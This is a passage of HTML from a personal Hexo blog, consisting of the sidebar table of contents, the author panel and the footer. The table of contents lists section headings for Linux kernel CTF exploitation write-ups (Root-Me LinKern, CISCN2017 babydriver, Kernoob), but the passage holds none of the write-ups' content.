class="nav-link" href="#编写shellcode"><span class="nav-number">3.2.4.1.</span> <span class="nav-text">编写shellcode</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-1"><span class="nav-number">3.2.5.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#调试信息-1"><span class="nav-number">3.2.5.1.</span> <span class="nav-text">调试信息</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Root-Me-LinKern-x86-basic-ROP"><span class="nav-number">3.3.</span> <span class="nav-text">3.[Root-Me]LinKern x86 - basic ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载文件-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备"><span class="nav-number">3.3.2.</span> <span class="nav-text">预备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析init文件-1"><span class="nav-number">3.3.3.</span> <span class="nav-text">分析init文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析LKMs文件-2"><span class="nav-number">3.3.4.</span> <span class="nav-text">分析LKMs文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">3.3.5.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#test1"><span class="nav-number">3.3.5.1.</span> <span class="nav-text">test1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#test2"><span class="nav-number">3.3.5.2.</span> <span class="nav-text">test2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-2"><span class="nav-number">3.3.6.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-CISCN2017-–-babydriver"><span class="nav-number">3.4.</span> <span class="nav-text">4.CISCN2017 – babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载文件-3"><span class="nav-number">3.4.1.</span> <span class="nav-text">下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备-1"><span class="nav-number">3.4.2.</span> <span class="nav-text">预备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">3.4.3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#init"><span class="nav-number">3.4.3.1.</span> <span class="nav-text">init</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LKMs"><span class="nav-number">3.4.3.2.</span> <span class="nav-text">LKMs</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">3.4.4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#调试信息-2"><span class="nav-number">3.4.4.1.</span> <span class="nav-text">调试信息</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">3.5.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2020高校战疫分享赛-–-Kernoob"><span class="nav-number">3.6.</span> <span class="nav-text">5.2020高校战疫分享赛 – Kernoob</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载文件-4"><span class="nav-number">3.6.1.</span> <span class="nav-text">下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预备-2"><span class="nav-number">3.6.2.</span> <span class="nav-text">预备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析-1"><span class="nav-number">3.6.3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#init-1"><span class="nav-number">3.6.3.1.</span> <span class="nav-text">init</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LKMs-1"><span class="nav-number">3.6.3.2.</span> <span class="nav-text">LKMs</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Shuwen</p>
  <div class="site-description" itemprop="description">做有意思的事，有意思地做事</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">المقالات</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">التصنيفات</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">الوسوم</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Shuwen</span>
</div>
  <div class="powered-by">تطبيق الموقع <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
